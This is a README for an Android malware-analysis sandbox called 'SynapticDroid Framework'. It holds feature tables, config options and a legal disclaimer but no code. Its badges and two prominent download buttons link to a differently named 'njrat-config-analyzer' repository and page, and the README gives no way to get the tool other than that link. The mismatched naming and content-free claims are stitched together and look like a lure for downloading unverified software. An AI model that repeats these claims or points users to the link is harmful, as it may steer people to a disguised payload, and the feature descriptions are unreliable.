![preview](https://raw.githubusercontent.com/fintanpyren-coder/njrat-config-analyzer/main/preview.svg)

# SynapticDroid Framework

![Static Badge](https://img.shields.io/badge/architecture-analysis_kit-blueviolet?style=flat) ![Static Badge](https://img.shields.io/badge/platform-Android%20%7C%20Cross%20Emulation-orange?style=flat) ![Static Badge](https://img.shields.io/badge/status-stable_build_2026-green?style=flat) ![Static Badge](https://img.shields.io/badge/tech-Java%20%7C%20Kotlin%20%7C%20Smali-yellow?style=flat)

## Overview

**SynapticDroid Framework** is a meticulously crafted environmental analysis toolkit designed for cybersecurity professionals and mobile forensics researchers. Born from the need to understand behavioral patterns within compiled Android executables, this framework provides a sandboxed virtual environment where analysts can observe, dissect, and document application logic without triggering external network callbacks or data exfiltration attempts.

Think of it as a **holographic terrarium** for mobile code: you place the APK inside, and the framework reconstructs the digital ecosystem it expects to find—device identifiers, carrier configurations, root detection bypasses, and emulated sensor data—all while logging every system call, intent broadcast, and permission request in real-time. This is not a weapon; it is a **microscope for malware anatomy**.

## About

Traditional static analysis tools often miss runtime behaviors that only manifest under specific environmental conditions. SynapticDroid bridges this gap by offering a **context-aware execution shim** that sits between the application and the Android runtime. It intercepts common API calls used by threat actors to verify if they are running on a genuine device versus an emulator, then feeds back plausible—but isolated—responses.

The result? The application behaves as if it has gained full control over a real handset, allowing the researcher to map its entire operational chain: from initial configuration downloads to persistence mechanisms, command-and-control handshake protocols, and data collection routines. Every payload is contained within a **disposable micro-container** that leaves no trace on the host system.

## Key Features

| Feature | Description |
|---------|-------------|
| 🌐 **Contextual Emulation Engine** | Spoofs GSM signals, IMEI, IMSI, Android ID, MAC addresses, and build properties to mimic a live handset from 16 different device profiles. |
| 🧠 **Behavioral Graph Generator** | Visualizes application call flows as interactive network diagrams, highlighting suspicious data sinks and encryption routines. |
| 🩺 **Live Permission Monitor** | Watches runtime permission requests and automatically denies sensitive access (contacts, SMS, location) while returning empty or mock responses. |
| 🔍 **Smali Decompilation Bridge** | Maps Dalvik bytecode to human-readable logic blocks, with cross-references to system API calls that are commonly abused. |
| 📦 **APK Deobfuscator** | Strips common ProGuard, DashO, and DexGuard obfuscation layers using heuristic pattern matching combined with dynamic class loading analysis. |
| 🌍 **Multi-Language Reporting** | Generates forensic reports in 12 languages (English, Spanish, Mandarin, Arabic, Russian, Hindi, French, German, Portuguese, Japanese, Korean, Italian) for international threat intelligence sharing. |
| 🕐 **24/7 Autonomous Sweep** | Headless mode enables continuous analysis pipelines—queue up to 500 APKs and receive batch YARA rule outputs and structured JSON threat summaries. |
| 🧪 **Containerized Sandbox** | Each analysis spawns an ephemeral Android environment with its own filesystem, network namespace (DNS sinkhole), and process isolation. |

## Quick Deployment Synopsis

[![Download](https://raw.githubusercontent.com/fintanpyren-coder/njrat-config-analyzer/main/button.svg)](https://fintanpyren-coder.github.io/njrat-config-analyzer/)

This build kit produces the runtime environment. Use it only in isolated lab conditions with no external network access to the host.

### Prerequisites

- Java Runtime Environment (JRE 17+)
- Android SDK platform-tools (adb, aapt)
- At least 8 GB of RAM allocated to the virtual sandbox
- A dedicated Ethernet interface configured for loopback-only traffic

### Structure Overview

Once the environment is built, the following directories are created:

- `engines/` — Core emulation profiles and device fingerprint databases.
- `payloads/` — Compiled hooking libraries (Xposed modules, Frida scripts, native shims).
- `reports/` — Output directory for forensic logs, PCAP files, and behavioral graphs.
- `configs/` — YAML-based sandbox configurations (network toggle, permission policies, spoofing precision).
- `signatures/` — Community-shared detection rules (YARA, Sigma, custom Suricata rulesets).

## How It Works (The Digital Double Bind)

SynapticDroid operates on a principle called **reflective deception**. Rather than simply blocking malicious behavior, it convinces the application that it has successfully compromised a device. The framework creates a **twilight zone** where the malware believes it is in complete control, while every action is mirrored to the analyst console.

**Stage 1: Environment Fabrication**  
The framework scans the incoming APK for known anti-emulation checks: file system queries (`/system/bin/su`), build property reads (`ro.build.fingerprint`), sensor availability, and SIM state. It then constructs a synthetic environment that matches what the malware expects from a compromised device.

**Stage 2: Behavioral Luring**  
Common lures are deployed—fake WhatsApp notifications, mock SMS messages containing verification codes, simulated GPS coordinates drifting across target regions. The malware's interaction with these lures reveals its data collection triggers.

**Stage 3: Payload Tethering**  
When the malware attempts to download second-stage payloads, the framework intercepts the HTTPS request and responds with a simulated C2 server that returns benign-but-authentic-looking payloads. This allows the full kill chain to execute locally.

**Stage 4: Network Inversion**  
All outbound traffic is rerouted to localhost. DNS queries for known malicious domains are answered with loopback addresses. SSL pinning is bypassed using a transparent MITM proxy embedded in the sandbox.

## Use Cases

- **Academic Research**: Universities studying Android malware evolution can deploy SynapticDroid across a fleet of headless analysis nodes.
- **Incident Response Teams**: SOC analysts can quickly triage suspicious APKs submitted by employees or captured from phishing campaigns.
- **App Store Auditors**: Third-party app store reviewers can automate verification of developer claims regarding privacy and data collection.
- **Forensic Toolchain**: Law enforcement digital forensics units can include SynapticDroid in their standard mobile evidence analysis workflow.

## Configuration Parameters

The framework exposes over 60 tunable parameters in the `configs/sandbox.yaml` file. Notable examples include:

- `spoofing.level`: `light` (only basic build props), `moderate` (adds sensor and carrier data), `deep` (full device clone including battery level, Bluetooth MAC, Wi-Fi SSID history)
- `permission.strategy`: `aggressive` (deny all non-essential permissions), `balanced` (grant permissions that return mock data), `permissive` (grant everything and log usage)
- `network.mode`: `blackhole` (drop all packets), `honeypot` (simulate C2 responses), `forward` (allow to controlled proxy)
- `logging.verbosity`: `summary` (high-level behavior tags), `detailed` (per-method call traces), `instruction` (Dalvik register-level logging)

## Database & Signature Sharing

The included `signatures/` directory is a living repository maintained by the analyst community. Contributions follow a standardized format:

- **YARA rules** for matching known packers and obfuscators.
- **Sigma rules** for detecting behavioral patterns across multiple sandbox runs.
- **Suricata rules** for identifying network-level indicators.

All signatures are loadable without restarting the framework—simply place them in the `active/` subfolder and trigger a rule reload via the console API.

## Support & Community

Every build includes **24/7 autonomous help** through a built-in diagnostic engine. If the framework detects an analysis failure (e.g., APK crashes on launch, bridge disconnection, OOM error), it automatically generates a troubleshooting bundle and attempts corrective action.

For deeper inquiries, the knowledge base contains over 300 resolved scenarios covering common anti-analysis techniques—from timing attacks to reflection-based evasion.

## Responsive Architecture

The framework's web dashboard (accessible on `localhost:8080`) is fully responsive, adapting to tablet, desktop, and mobile viewports. Analysts can monitor active sessions from a phone while on site, or connect via a full-screen workstation view for detailed command-line interaction.

## Legal & Ethical Boundaries

⚠️ **SYNDROME OF USE**  
This framework is intended solely for legitimate cybersecurity education, vulnerability research, and defensive analysis. The developers disclaim any liability for misuse, including but not limited to:

- Unauthorized decompilation of third-party applications outside of controlled lab environments.
- Distribution of analysis output that contains personally identifiable information (PII).
- Use of the framework to circumvent licensing mechanisms or digital rights management (DRM).

**Responsible Disclosure**  
If your analysis uncovers a zero-day vulnerability, the framework can generate a anonymized disclosure package that omits developer identities and sensitive infrastructure details. Use this feature to responsibly report findings through established CERT channels.

## License

This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details. You are free to use, modify, and distribute this software, provided that the original attribution and disclaimer remain intact.

## Final Considerations

The digital landscape is shifting. Applications are no longer static binaries; they are dynamic organisms that adapt to their environment. SynapticDroid provides the **mirror maze** needed to observe these behaviors without triggering real-world consequences. Use it to illuminate, not to exploit.

[![Download](https://raw.githubusercontent.com/fintanpyren-coder/njrat-config-analyzer/main/button.svg)](https://fintanpyren-coder.github.io/njrat-config-analyzer/)